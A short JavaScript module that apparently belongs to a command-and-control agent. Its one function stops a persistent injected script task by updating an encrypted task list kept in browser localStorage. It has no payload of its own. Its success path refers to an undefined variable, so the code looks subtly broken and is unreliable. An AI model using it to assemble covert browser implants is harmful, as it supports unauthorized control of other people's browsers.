async function kill_inline_js_persistent(task, command, params){
    try{
        dec_runner = await decrypt_runner(localStorage.getItem('runner'));
        dict_runner = JSON.parse(dec_runner)
        dict_runner[task['id']][2] = true;
        localStorage.setItem('runner',JSON.stringify(dict_runner));
        return {"user_output": contents.toString(), "completed": true};
    }
    catch(error){
        return {"user_output": error.toString(), "status": "error", "completed": true};
    }
};

exports.kill_inline_js_persistent = kill_inline_js_persistent